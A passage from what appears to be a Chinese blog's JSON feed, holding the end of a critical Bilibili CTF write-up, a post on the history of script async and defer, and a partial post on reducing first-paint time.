shell、提权的，结果第八题草草 <code>get flag8</code> 了事；第十题的「文件路径猜解」更是非常无厘头，当做题人构建完能绕过 <code>is_numeric</code> 和 <code>intval</code>  的 Payload 后，还要猜测 <code>url</code> 参数的取值需要包含 <code>flag.txt</code> 才能取到最终的 flag；而且第十题拿到的图片直接 <code>tail</code> 就能拿到 flag，而图片隐写本来是非常经典的 CTF 考法。</p>\n<p>无厘头的题目、加上混乱的活动页面（Vue 和 jQuery 齐飞、Element UI 共 Bootstrap 一色），再联想起 Bilibili 中间件源码泄漏、Anankke 在新年活动上 <a href=\"https://blog.anank.ke/w/pilipili_cheers\">只用两小时就刷出了 11 亿美食值</a>，我们大体上可以猜测的出 Bilibili 内部混乱的管理、松散的组织，和极度不重视信息安全、乃至极度不重视技术的风气。Bilibili 这一次的 CTF 暴露出来的问题，远不止选手用 <code>/blog/end.php</code> 读取 <code>/dev/urandom</code> 和 <code>/dev/random</code> 耗尽靶机性能导致题目 404 这么简单了。</p>\n<div class=\"license\">\n<div class=\"license-title\">Bilibili 2020「1024 程序员节」CTF Write Up</div>\n<div class=\"license-link\"><a href=\"https://blog.skk.moe/post/2020-bilibili-1024-ctf-write-up/\">https://blog.skk.moe/post/2020-bilibili-1024-ctf-write-up/</a></div>\n<div class=\"license-meta\">\n<div class=\"license-meta-item\">\n<div class=\"license-meta-title\">本文作者</div>\n<div class=\"license-meta-text\">Sukka</div>\n</div>\n<div class=\"license-meta-item\">\n<div class=\"license-meta-title\">发布于</div>\n<div class=\"license-meta-text\">2020-10-25</div>\n</div>\n<div class=\"license-meta-item\">\n<div class=\"license-meta-title\">许可协议</div>\n<div class=\"license-meta-text\"><a href=\"https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">CC BY-NC-SA 4.0</a></div>\n</div>\n</div>\n<div>转载或引用本文时请遵守许可协议，注明出处、不得用于商业用途！</div>\n</div>\n","link":"https://blog.skk.moe/post/2020-bilibili-1024-ctf-write-up/"},{"title":"从 Google Analytics 的统计代码说起 —— 谈谈 script 标签的 async 和 defer 属性","date":"2020-10-13 09:25:00","description":"\n<p>之前我在「<a href=\"https://blog.skk.moe/post/how-to-make-a-fast-blog/\">天下武功，唯快不破 —— 我是这样优化博客的</a>」一文中提到「对于大部分浏览器来说，确保 JS 异步加载和执行的做法其实是在操作 DOM 动态插入 <code>&lt;script async&gt;</code>」，但是并没有给出详细原因。这一次我以 Google Analytics 的统计代码为引子，详细讲讲 <code>&lt;script&gt;</code> 的 <code>async</code> 和 <code>defer</code> 属性、以及它们背后的故事。</p>\n<h2>拆开 Google Analytic 的统计代码</h2>\n<p>现在 Google 推出了 Google Tag Manager，通过 <code>window.gtag</code> 可以轻易加载包括 <code>analytics.js</code>、Google AD、Google OAuth 等 Google 插件：</p>\n<pre><code class=\"hljs html\"><span class=\"hljs-comment\">&lt;!-- Global site tag (gtag.js) - Google Analytics --&gt;</span><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">script</span> <span class=\"hljs-attr\">async</span> <span class=\"hljs-attr\">src</span>=<span class=\"hljs-string\">\"https://www.googletagmanager.com/gtag/js?id=UA-122669675-1\"</span>&gt;</span><span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">script</span>&gt;</span><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">script</span>&gt;</span><span class=\"javascript\"></span><span class=\"javascript\">  <span class=\"hljs-built_in\">window</span>.dataLayer = <span class=\"hljs-built_in\">window</span>.dataLayer || [];</span><span class=\"javascript\">  <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title\">gtag</span>(<span class=\"hljs-params\"></span>)</span>{dataLayer.push(<span class=\"hljs-built_in\">arguments</span>);}</span><span class=\"javascript\">  gtag(<span class=\"hljs-string\">'js'</span>, <span class=\"hljs-keyword\">new</span> <span class=\"hljs-built_in\">Date</span>());</span><span class=\"javascript\"></span><span class=\"javascript\">  gtag(<span class=\"hljs-string\">'config'</span>, <span class=\"hljs-string\">'UA-XXXXX-Y'</span>);</span><span class=\"javascript\"></span><span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">script</span>&gt;</span></code></pre>\n<p>在 Google Tag Manager 出现之前，大部分人更熟悉传统的 <code>analytics.js</code> 统计代码：</p>\n<pre><code class=\"hljs html\"><span class=\"hljs-comment\">&lt;!-- Google Analytics --&gt;</span><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">script</span>&gt;</span><span class=\"javascript\"></span><span class=\"javascript\">(<span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span>(<span class=\"hljs-params\">i,s,o,g,r,a,m</span>)</span>{i[<span class=\"hljs-string\">'GoogleAnalyticsObject'</span>]=r;i[r]=i[r]||<span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span>(<span class=\"hljs-params\"></span>)</span>{</span><span class=\"javascript\">(i[r].q=i[r].q||[]).push(<span class=\"hljs-built_in\">arguments</span>)},i[r].l=<span class=\"hljs-number\">1</span>*<span class=\"hljs-keyword\">new</span> <span class=\"hljs-built_in\">Date</span>();a=s.createElement(o),</span><span class=\"javascript\">m=s.getElementsByTagName(o)[<span class=\"hljs-number\">0</span>];a.async=<span class=\"hljs-number\">1</span>;a.src=g;m.parentNode.insertBefore(a,m)</span><span class=\"javascript\">})(<span class=\"hljs-built_in\">window</span>,<span class=\"hljs-built_in\">document</span>,<span class=\"hljs-string\">'script'</span>,<span class=\"hljs-string\">'https://www.google-analytics.com/analytics.js'</span>,<span class=\"hljs-string\">'ga'</span>);</span><span class=\"javascript\"></span><span class=\"javascript\">ga(<span class=\"hljs-string\">'create'</span>, <span class=\"hljs-string\">'UA-XXXXX-Y'</span>, <span class=\"hljs-string\">'auto'</span>);</span><span class=\"javascript\">ga(<span class=\"hljs-string\">'send'</span>, <span class=\"hljs-string\">'pageview'</span>);</span><span class=\"javascript\"></span><span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">script</span>&gt;</span><span class=\"hljs-comment\">&lt;!-- End Google Analytics --&gt;</span></code></pre>\n<p>Google 提供的代码是经过压缩后的版本。不过这段代码很短，完全不使用 debugger 等方法也可以还原出原始的代码，让我们拆拆看吧。</p>\n<p>首先不难看出这是一个 IIFE 函数，变量 <code>i</code>、<code>s</code>、<code>o</code>、<code>g</code> 和 <code>r</code>分别指的是 <code>window</code>、<code>document</code>、<code>'script'</code>、<code>https://www.google-analytics.com/analytics.js</code> 和 <code>'ga'</code>（变量 <code>a</code> 和 <code>m</code> 尚未被赋值）。让我们替换这些变量、把 IIFE 拆开：</p>\n<pre><code class=\"hljs js\"><span class=\"hljs-built_in\">window</span>[<span class=\"hljs-string\">'GoogleAnalyticsObject'</span>] = <span class=\"hljs-string\">'ga'</span>;<span class=\"hljs-built_in\">window</span>[<span class=\"hljs-string\">'ga'</span>] = <span class=\"hljs-built_in\">window</span>[<span class=\"hljs-string\">'ga'</span>] || <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> (<span class=\"hljs-params\"></span>) </span>{  <span class=\"hljs-built_in\">window</span>[<span class=\"hljs-string\">'ga'</span>].q = (<span class=\"hljs-built_in\">window</span>[<span class=\"hljs-string\">'ga'</span>].q || []).push(<span class=\"hljs-built_in\">arguments</span>)};<span class=\"hljs-built_in\">window</span>[<span class=\"hljs-string\">'ga'</span>].l = +<span class=\"hljs-keyword\">new</span> <span class=\"hljs-built_in\">Date</span>();<span class=\"hljs-keyword\">var</span> a = <span class=\"hljs-built_in\">document</span>.createElement(<span class=\"hljs-string\">'script'</span>);a.async = <span class=\"hljs-number\">1</span>;a.src = <span class=\"hljs-string\">'https://www.google-analytics.com/analytics.js'</span>;<span class=\"hljs-keyword\">var</span> m = <span class=\"hljs-built_in\">document</span>.getElementsByTagName(<span class=\"hljs-string\">'script'</span>)[<span class=\"hljs-number\">0</span>];m.parentNode.insertBefore(a, m);</code></pre>\n<p>这下就清楚多了。抛开 Google Analytics 的队列初始化、函数初始化的操作，<code>analytics.js</code> 本质上是通过 JS 动态创建一个 <code>&lt;script async&gt;</code> 标签、并插入到 DOM 中所有 <code>&lt;script&gt;</code> 标签之前。</p>\n<p><a href=\"https://developers.google.com/analytics/devguides/collection/analyticsjs/\">Google 关于 <code>analytics.js</code> 的文档</a> 是这么介绍的：</p>\n<blockquote>\n<p>While the Google Analytics tag described above ensures the script will be loaded and executed asynchronously on all browsers, it has the disadvantage of not allowing modern browsers to preload the script.</p>\n<p>虽然上述代码保证了脚本在所有浏览器上都会异步地加载和执行，但是它也有一个缺陷、它不能够让浏览器 preload 外部的脚本文件。</p>\n</blockquote>\n<p>Google 在文档中也给出了「现代浏览器」专用的代码，看起来和今天的 Google Tag Manager 载入代码非常接近：</p>\n<pre><code class=\"hljs html\"><span class=\"hljs-comment\">&lt;!-- Google Analytics --&gt;</span><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">script</span>&gt;</span><span class=\"javascript\"></span><span class=\"javascript\"><span class=\"hljs-built_in\">window</span>.ga=<span class=\"hljs-built_in\">window</span>.ga||<span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span>(<span class=\"hljs-params\"></span>)</span>{(ga.q=ga.q||[]).push(<span class=\"hljs-built_in\">arguments</span>)};ga.l=+<span class=\"hljs-keyword\">new</span> <span class=\"hljs-built_in\">Date</span>;</span><span class=\"javascript\">ga(<span class=\"hljs-string\">'create'</span>, <span class=\"hljs-string\">'UA-XXXXX-Y'</span>, <span class=\"hljs-string\">'auto'</span>);</span><span class=\"javascript\">ga(<span class=\"hljs-string\">'send'</span>, <span class=\"hljs-string\">'pageview'</span>);</span><span class=\"javascript\"></span><span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">script</span>&gt;</span><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">script</span> <span class=\"hljs-attr\">async</span> <span class=\"hljs-attr\">src</span>=<span class=\"hljs-string\">'https://www.google-analytics.com/analytics.js'</span>&gt;</span><span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">script</span>&gt;</span><span class=\"hljs-comment\">&lt;!-- End Google Analytics --&gt;</span></code></pre>\n<p>Google 文档也对第二种代码进行了介绍：</p>\n<blockquote>\n<p>The alternative async tag below adds support for preloading, which will provide a small performance boost on modern browsers, but can degrade to synchronous loading and execution on IE 9 and older mobile browsers that do not recognize the <code>async</code> script attribute.</p>\n<p>第二种方法在现代浏览器上会略微提升性能，因为现代浏览器支持 preloading。但是在不认识 <code>async</code> 属性的 IE9 和一些老旧的移动端浏览器上，这种方法会降级为同步加载和执行。</p>\n</blockquote>\n<p>所以，结合上述代码和 Google 文档中的描述，我们不难得出结论：</p>\n<ul>\n<li>第一种做法（由 JS 生成 <code>&lt;script async&gt;</code> 标签、动态插入 DOM 中）可以确保 <code>analytics.js</code> 被异步加载和执行，但是在现代浏览器上由于不能提前发现 <code>analytics.js</code> 、不能 preload。</li>\n<li>第二种做法在 HTML 中直接声明了 <code>&lt;script async&gt;</code>、可以被现代浏览器在 Parse HTML 阶段发现 <code>analytics.js</code> 并 preload。但是对于「并不现代的」浏览器中，这种做法不能保证 <code>analytics.js</code> 被异步加载和执行。</li>\n</ul>\n<p>那么，为什么 Google 要这么说呢？</p>\n<h2>混乱的 defer 和 async 实现</h2>\n<p>绝大部分从事前端开发的程序员应该都非常了解 <code>defer</code> 和 <code>async</code> 以及他们的区别：</p>\n<ul>\n<li>\n<code>async</code> 的加载不会阻碍 DOM 的解析，但是当加载完后就会立即执行，执行时会阻碍 DOM 的解析</li>\n<li>\n<code>defer</code> 的加载也不会阻碍 DOM 的解析，并且会在 DOM 解析完后、<code>DOMContentLoaded</code> 触发之前执行</li>\n</ul>\n<p>鲜少有人知道的是，在 HTML5 之前，异步加载和执行外部脚本有一段混乱而荒唐的历史。</p>\n<p><code>defer</code> 属性的历史可以追溯到 1999 年 12 月 24 日制定的 HTML4.01 规范。在 <a href=\"https://www.w3.org/TR/html401/interact/scripts.html#adef-defer\">规范的第 18.2 节中的 18.2.1「SCRIPT 元素」</a> 中，有对 <code>defer</code> 属性的描述：</p>\n<blockquote>\n<p>When set, this boolean attribute provides a hint to the user agent that the script is not going to generate any document content (e.g., no “document.write” in javascript) and thus, the user agent can continue parsing and rendering.</p>\n<p>该 Boolean Attribute 用于提示 User Agent 这份脚本不会生成 document 内容（如，不使用 <code>document.write</code>），因此 User Agent 在遇到该脚本时不应该暂停解析和渲染 document。</p>\n</blockquote>\n<p>值得注意的是，在 HTML4.01 规范中没有强制浏览器用什么行为面对 <code>defer</code> 属性，各个浏览器的实现导致了千奇百怪的行为，这里仅简单列举几个 Quirk 行为：</p>\n<ul>\n<li>2001 年发布的 IE 6 开始对 <code>defer</code> 属性提供支持，但是直到 11 年后 IE 10 发布之前，IE 都不能保证带有 <code>defer</code> 属性的 <code>&lt;script&gt;</code> 能够按顺序执行：如果第一个 <code>defer</code> 的 <code>&lt;script&gt;</code> 使用 DOM API 修改了 DOM 结构、那么第二个 <code>&lt;script defer&gt;</code> 会在第一个 <code>&lt;script&gt;</code> 执行完毕之前就会开始执行。</li>\n<li>2009 年发布的 Firefox 3.5 开始对 <code>defer</code> 属性提供支持，<a href=\"https://bugzilla.mozilla.org/show_bug.cgi?id=688580\">但是带有 <code>defer</code> 的 <code>&lt;script&gt;</code> 可能会在 <code>DOMContentLoaded</code> 之后加载和执行</a>，而且 Firefox 甚至会异步执行带有 <code>defer</code> 属性的内联脚本。这一行为直到五年后在 Firefox 31 中才被修复。</li>\n<li>2010 年的 Chrome 8 开始实现 <code>defer</code> 属性。但如果页面的 MIME Type 为 XHTML（<code>application/xhtml+xml</code>），那么 <a href=\"https://bugs.chromium.org/p/chromium/issues/detail?id=874749\">Chrome 会无视 <code>&lt;script&gt;</code> 的 <code>defer</code> 属性</a>，因为 <a href=\"https://bugs.chromium.org/p/chromium/issues/detail?id=611136\">在 XHTML 中 <code>defer</code> 属性只是一个可选实现</a>。</li>\n</ul>\n<p>终于在 HTML5 中，不仅 <code>defer</code> 应有的行为被正式确定下来，而且还介绍了一个新的属性 <code>async</code>，提供了「真正异步地」加载和执行外部脚本的方式。也正是因为 HTML5 正式发布，下面这张介绍 <code>defer</code> 和 <code>async</code> 区别的图也开始深入人心：</p>\n<blockquote><p>这张出现在绝大部分文章中的图，正是来自 HTML5 规范：<a href=\"https://html.spec.whatwg.org/multipage/scripting.html#attr-script-async\">https://html.spec.whatwg.org/multipage/scripting.html#attr-script-async</a></p></blockquote>\n<p>IE 10、Chrome 8、Firefox 3.6 都对 <code>async</code> 属性提供了支持。相对于 <code>defer</code> 混乱的实现，浏览器对 <code>async</code> 的实现可谓是乖巧了许多：除 Safari 5.0 会无视 <code>async</code> 的取值外（<code>async=false</code> 时仍然会异步地加载和执行该外部脚本。这一 Bug 在 Safari 5.1 即被修复），绝大部分浏览器的实现都很正常。</p>\n<h2>等等，动态插入的 script 标签呢</h2>\n<p>如果你还记得 Google 给出的第一种 <code>analytics.js</code> 的加载方法的话（什么？你不记得了？快回到第一节再看一遍），你会注意到 Google 为了「保证了脚本在所有浏览器上都会异步地加载和执行」，使用了 <code>document.createElement('script')</code> 和 <code>el.parentNode.insertBefore</code> 动态插入 <code>&lt;script&gt;</code> 标签。这就引出了这一节的内容：动态插入的 <code>&lt;script&gt;</code> 应该按照什么顺序加载和执行呢？</p>\n<p>这个问题在 HTML4.01 的规范中完全没有说明，因此 HTML5 发布之前，当时的浏览器也依然采用了自己的实现：</p>\n<ul>\n<li>对于 WebKit、Blink 和 IE，动态插入的脚本将会被默认视为需要被异步加载和执行的脚本。如果要同步执行，需要显式声明 <code>async = false</code>。</li>\n<li>对于 Presto（早期 Opera 使用的自研内核）和 Firefox &lt;= 4，动态插入的脚本会默认同步加载和执行，除非显示声明 <code>async = true</code>。不过从 Firefox 4.0 开始，动态插入的脚本将会异步加载和执行，以和 IE、WebKit 行为保持一致（因此同步执行也一样需要显式声明 <code>async = false</code> ）；当 Opera 15 开始更换为基于 Chormium 开发（当时 Chromium 版本为 28）后，行为也变得和 IE、WebKit 一致。</li>\n</ul>\n<p>在 HTML5 规范中，这一问题终于被一劳永逸的解决了。在「<a href=\"https://html.spec.whatwg.org/multipage/scripting.html#script-processing-model\">HTML Standard - 4.12.1.1 Processing Model</a>」中明确规定了浏览器应该如何处理动态插入的 <code>&lt;script&gt;</code>。对于传统的脚本（非 Module），大致处理流程如下所示：</p>\n<blockquote><p>本图由 Sukka 绘制，按照 CC BY-NC-SA 4.0 协议共享。使用时请遵守许可协议，注明出处、不得被用于商业用途（除非获得书面许可）。</p></blockquote>\n<h2>尾声</h2>\n<p>Google Analytics 在 2013 年开始逐渐用 <code>analytics.js</code> 代替 <code>ga.js</code> 时，市面上同时存在有现代的支持 HTML5 和 <code>async</code> 属性的浏览器、和不支持 <code>async</code> 属性的「前 HTML5 时代的」古董浏览器。如果要保证在所有的浏览器上 Google Analytics 都能被异步地加载和执行，动态地将 <code>&lt;script&gt;</code> 标签插入 DOM 中、并显式声明 <code>async = true</code> 无疑是唯一的方法。随着古董浏览器逐渐退出人们的视线、实现 <code>async</code> 属性的浏览器在全球的份额已经达到了 98.08%，Google 终于开始直接用 <code>&lt;script async&gt;</code> 标签引入 Google Tag Manager。</p>\n<div class=\"license\">\n<div class=\"license-title\">从 Google Analytics 的统计代码说起 —— 谈谈 script 标签的 async 和 defer 属性</div>\n<div class=\"license-link\"><a href=\"https://blog.skk.moe/post/script-async-defer/\">https://blog.skk.moe/post/script-async-defer/</a></div>\n<div class=\"license-meta\">\n<div class=\"license-meta-item\">\n<div class=\"license-meta-title\">本文作者</div>\n<div class=\"license-meta-text\">Sukka</div>\n</div>\n<div class=\"license-meta-item\">\n<div class=\"license-meta-title\">发布于</div>\n<div class=\"license-meta-text\">2020-10-13</div>\n</div>\n<div class=\"license-meta-item\">\n<div class=\"license-meta-title\">许可协议</div>\n<div class=\"license-meta-text\"><a href=\"https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">CC BY-NC-SA 4.0</a></div>\n</div>\n</div>\n<div>转载或引用本文时请遵守许可协议，注明出处、不得用于商业用途！</div>\n</div>\n","link":"https://blog.skk.moe/post/script-async-defer/"},{"title":"再快一点，再快一点 —— 优化博客白屏时间的实践","date":"2020-10-03 08:40:00","description":"\n<p>两个多月以前，我写了一篇文章 <a href=\"https://blog.skk.moe/post/how-to-make-a-fast-blog/\">介绍我是如何优化我的博客的</a>，但是我对于博客的白屏时间仍然不满意。过去一个月我在博客上进行了一系列优化实践，终于成功将博客的白屏时间减少了将近 50%，这篇文章就来记录优化的过程和方案。</p>\n<h2>确定和分析白屏时间</h2>\n<p>First Paint 和 First Contentful Paint 是衡量白屏时间的重要指标。Google Chrome 团队提供了专门的库 <code>web-vitals</code> 用于在浏览器中衡量这些指标。直接在本地开发环境中引入该库：</p>\n<pre><code class=\"hljs html\"><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">script</span> <span class=\"hljs-attr\">type</span>=<span class=\"hljs-string\">\"module\"</span>&gt;</span><span class=\"javascript\"></span><span class=\"javascript\">  <span class=\"hljs-keyword\">import</span> {getFCP, getLCP, getFID} <span class=\"hljs-keyword\">from</span> <span class=\"hljs-string\">'https://unpkg.com/web-vitals@0.2.4/dist/web-vitals.es5.min.js?module'</span>;</span><span class=\"javascript\">  <span class=\"hljs-comment\">// 获取 First Contentful Paint</span></span><span class=\"javascript\">  getFCP(<span class=\"hljs-function\">(<span class=\"hljs-params\">{ name, value }</span>) =&gt;</span> <span class=\"hljs-built_in\">console</span>.log(name, value));</span><span class=\"javascript\">  <span class=\"hljs-comment\">// 获取 Largest Contentful Paint</span></span><span class=\"javascript\">  getLCP(<span class=\"hljs-function\">(<span class=\"hljs-params\">{ name, value }</span>) =&gt;</span> <span class=\"hljs-built_in\">console</span>.log(name, value));</span><span class=\"javascript\">  <span class=\"hljs-comment\">// 获取 First Input Delay</span></span><span class=\"javascript\">  getFID(<span class=\"hljs-function\">(<span class=\"hljs-params\">{ name, value }</span>) =&gt;</span> <span class=\"hljs-built_in\">console</span>.log(name, value));</span><span class=\"javascript\"></span><span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">script</span>&gt;</span></code></pre>\n<p>访问在本地运行的 Hexo Server 实例（<code>http://localhost:4000</code>），打开任意一篇文章，然后在 Dev Tools 中切换到「Performance」Tab 中限制 Network 和 CPU 性能：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.3.4/1.png\" width=\"1276\" height=\"279\" class=\"lazy post-img\"></p>\n<blockquote><p>进行性能测试时，模拟移动端的网络和性能是非常重要的。然而，Firefox 的 Dev Tools 至今很遗憾地没有实现这个功能（许多类似的 Feature Request 在 Bugzilla 已经 stall 数个月了）。这也是为什么我钟情于使用 Chromium Based 的浏览器开发的原因。</p></blockquote>\n<p>刷新页面，Console 中会输出三个数值（单位均为毫秒）：</p>\n<pre><code class=\"hljs plaintext\">FCP 1537.4400000000605LCP 1921.934FID 3.559999997378327</code></pre>\n<p>可以看到，First Contentful Paint 时间在 1.5 秒左右、而 Largest Contentful Paint（最大的可视元素，此时是文章的头图）是 1.9 秒。考虑到这是在本地环境、TTFB 只受模拟的「Fast 3G」限制，不难想象在实际访客体验中白屏时间绝对不止 1.5 秒。</p>\n<h2>分析性能瓶颈</h2>\n<p>肯定了问题的确存在，接下来就需要寻找性能瓶颈了。在「Performance」Tab 中将 CPU 性能修改为「6x slowdown」放大性能瓶颈，然后用「Start profiling and reload page」按钮刷新页面和获取火焰图：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.3.4/2.png\" width=\"1386\" height=\"946\" class=\"lazy post-img\"></p>\n<p>其中，Layout 占据的时间（117.43ms）比 Parse HTML（22.48ms）和 Recalculate Style（20.37ms）都要长得多，基本可以认定这就是性能瓶颈了。接下来判断是页面什么元素导致了 Layout 的性能瓶颈。对博客中其它页面进行 Profiling，并将火焰图进行对比：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.3.4/3.png\" width=\"860\" height=\"450\" class=\"lazy post-img\"></p>\n<blockquote><p>从左往右分别是 「<a href=\"https://blog.skk.moe/post/make-oh-my-zsh-fly/\">我就感觉到快 —— zsh 和 oh my zsh 冷启动速度优化</a>」、首页、「<a href=\"https://blog.skk.moe/post/hello-world/\">Hello World</a>」页面的火焰图和 Layout 用时。</p></blockquote>\n<p>根据火焰图和三个页面的特征，猜测是文章内容部分导致了 Layout 用时过长。为了加以验证，在 CSS 中使用 <code>display: none</code> 将文章内容直接从 DOM 中离线，然后重新生成火焰图。</p>\n<blockquote><p>在页面渲染时， <code>display: none</code>  的元素会直接从 DOM 中离线、不参加 Style 和 Layout。</p></blockquote>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.3.4/4.png\" width=\"1194\" height=\"946\" class=\"lazy post-img\"></p>\n<p>将文章内容设置 <code>display: none</code> 后，Layout 性能直接提升了三倍，所以可以确认性能瓶颈就是文章内容的 Layout 了。</p>\n<h2>优化白屏时间</h2>\n<p>文章内容的 Layout 时间比较长，而文章内容在加载完之前不会触发 First Paint。所以如果需要缩短白屏时间，就必须缩短文章内容 Layout 的用时。</p>\n<p>Layout 是浏览器计算元素几何信息的过程：元素的大小、在页面中的位置。Layout 性能一般和 DOM 元素数量、布局复杂性、布局模型有关。对于 DOM 元素数量这一点没有什么好的解决方案 —— 文章就这么长、每个段落就是一个 <code>&lt;p&gt;</code> 元素；对于文章内容也没有布局复杂性或布局模型可言。因此这是一条死路。</p>\n<p>直接对着自己的博客动死脑筋是行不通的，我决定先和其他的内容网站的 Layout 性能对比一下：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.3.4/5.png\" width=\"960\" height=\"500\" class=\"lazy post-img\"></p>\n<blockquote><p>上图左一为知乎专栏文章「<a href=\"https://zhuanlan.zhihu.com/p/25800461\">PWA 在饿了么的实践经验</a>」的火焰图；左二为 QuQuBlog「<a href=\"https://imququ.com/post/optimize-tls-handshake.html\">TLS 握手优化详解</a>」的火焰图；左三为 dev.to 的「<a href=\"https://dev.to/mustapha/css-grid-illustrated-introduction-52l5\">CSS Grid: illustrated introduction</a>」的火焰图。</p></blockquote>\n<p>和其它内容网站比较发现，当页面包含较长篇幅的内容时，「CPU 6x slowdown」下 Layout 用时大抵在 100ms 到 200ms 左右。我的博客内容页面 Layout 用时在 120ms 属于正常范围、基本没有进一步优化的空间。</p>\n<p>不过，我在看 dev.to 的火焰图时发现了一个很有趣的现象：虽然完整 DOM 的 Layout 用时在 123.70ms、但是却发生在 First Paint 和 First Contentful Paint 之后。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.3.4/6.png\" width=\"1090\" height=\"314\" class=\"lazy post-img\"></p>\n<p>结合截图和火焰图可以发现，dev.to 在加载文章页面时，先只渲染 Navbar、触发 First Paint、结束白屏；之后继续 Parse HTML、渲染页面主体内容；最后是 Lazyload 后的文章头图、触发 Largest Contentful Paint。这种思路在 H5、小程序中都是很常见：使用 Placeholder （被称为 AppShell）缩短白屏时间、然后再通过 AJAX 获取数据填充到页面上。但是静态博客和小程序最大的区别就是不需要获取数据、文章内容是直接包含在 HTML 中返回的，所以在博客上实践这样的思路需要做一些改变。</p>\n<p>我的做法则是将 CSS 拆分，将 Navbar 和右下角 Fab 按钮的 CSS 提取出来、内联在 HTML 中、当页面加载时就可以 Style &amp; Layout。同时为页面主题内容添加 <code>display: none</code> 使其在 DOM 中离线，使其不影响 First Paint；页面主体内容的 CSS（包括  <code>display: block</code>） 拆分成独立的 CSS。由于 CSS 是「渲染阻塞（Render Blocking）」的资源，浏览器在 Parse HTML 时如果遇到 CSS 就会开始请求、并在 CSS 下载完成之前不会开始 Style &amp; Layout。因此，需要一个小 trick 实现异步加载 CSS（使 CSS 不再阻塞渲染）：</p>\n<pre><code class=\"hljs html\"><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">link</span> <span class=\"hljs-attr\">rel</span>=<span class=\"hljs-string\">\"stylesheet\"</span> <span class=\"hljs-attr\">href</span>=<span class=\"hljs-string\">\"defer.css\"</span> <span class=\"hljs-attr\">media</span>=<span class=\"hljs-string\">\"print\"</span> <span class=\"hljs-attr\">onload</span>=<span class=\"hljs-string\">\"this.media='all';this.onload=null\"</span>&gt;</span><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">noscript</span>&gt;</span><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">link</span> <span class=\"hljs-attr\">rel</span>=<span class=\"hljs-string\">\"stylesheet\"</span> <span class=\"hljs-attr\">href</span>=<span class=\"hljs-string\">\"defer.css\"</span>&gt;</span><span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">noscript</span>&gt;</span></code></pre>\n<p>带有 <code>[media=print]</code> 属性的 CSS 仍然会以低优先级加载，但并不会直接参与 Style &amp; Layout、因此不会阻塞渲染。当 CSS 文件下载后触发 <code>onload</code> 事件、将 <code>media</code> 属性改为 <code>all</code>、使 CSS 在当前页面生效。</p>\n<p>为了使白屏不显得枯燥，我还加了一个「加载中」的闪烁动画，使用 <code>animation-delay</code> 延迟 0.6 秒显示。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.3.4/9.png\" width=\"813\" height=\"849\" class=\"lazy post-img\"></p>\n<p>不过使用这种方案需要注意两个问题。一是当页面内容被 <code>display: none</code> 后、页面的高度会小于 viewport、因此浏览器不会展示滚动条；当页面内容被覆盖为 <code>display: block</code> 后、浏览器会重新展示滚动条、导致抖动，因此需要为 <code>&lt;html&gt;</code> 添加 <code>overflow-y: scroll</code>。另一个问题是新的 CSS 生效时会触发新的 Style &amp; Layout、可能会导致已经渲染过的 Navbar 和 Fab 按钮被再次 Layout，造成性能浪费；解决方案是使用「<a href=\"https://drafts.csswg.org/css-contain/\">CSS Containment</a>」草案中引入的 <code>contain</code> 属性，通过在 CSS 中显式声明当前元素及其后代与 DOM 的关系，当浏览器重新计算样式和布局时只会影响有限的 DOM。截至本文写就，Edge（Chromium Based）、Firefox、Chrome 都已经对 <code>contain</code> 属性提供了支持。关于 CSS Containment 的用法，可以参考 <a href=\"https://developer.mozilla.org/en-US/docs/Web/CSS/contain\">MDN 上对 contain 的说明</a>。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.3.4/7.png\" width=\"800\" height=\"368\" class=\"lazy post-img\"></p>\n<p>同时，如果使用异步加载 CSS，那么页面主体内容的显示时机就会受到两个因素制约 —— 除 Style &amp; Layout 外、还有 CSS 的加载。为了尽可能消除 CSS 加载对文章内容显示的影响，我为 CSS 设置了 HTTP/2 Push，这样 CSS 能够和 HTML 同时到达浏览器、但不会马上参与 First Paint 的 Style &amp; Layout。关于 HTTP/2 Push 的更多细节，可以参考我的文章「<a href=\"https://blog.skk.moe/post/http2-server-push/\">静态资源递送优化：HTTP/2 和 Server Push</a>」。</p>\n<p>实践的效果妙不可言：First Paint 之前的 Style &amp; Layout 用时加起来也不超过 50ms、几乎 HTML 一下载完就可以看到 Navbar。当 <code>defer.css</code> 加载完、样式和布局计算完后文章内容即绘制到屏幕上。如果 <code>defer.css</code> 出于某种原因没有及时加载（如 User-Agent 不支持 HTTP/2 Push、<code>defer.css</code> 未能命中缓存），那么「加载中…」就会展示出来，使访客不会认为页面失去响应。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.3.4/8.png\" width=\"1106\" height=\"945\" class=\"lazy post-img\"></p>\n<h2>尝试新属性</h2>\n<p>虽然减少了白屏时间，但是长篇幅的内容的布局计算仍然非常耗时；当文章越来越长时，用户仍然可能会对「加载中」失去耐心。不过 Chromium 85 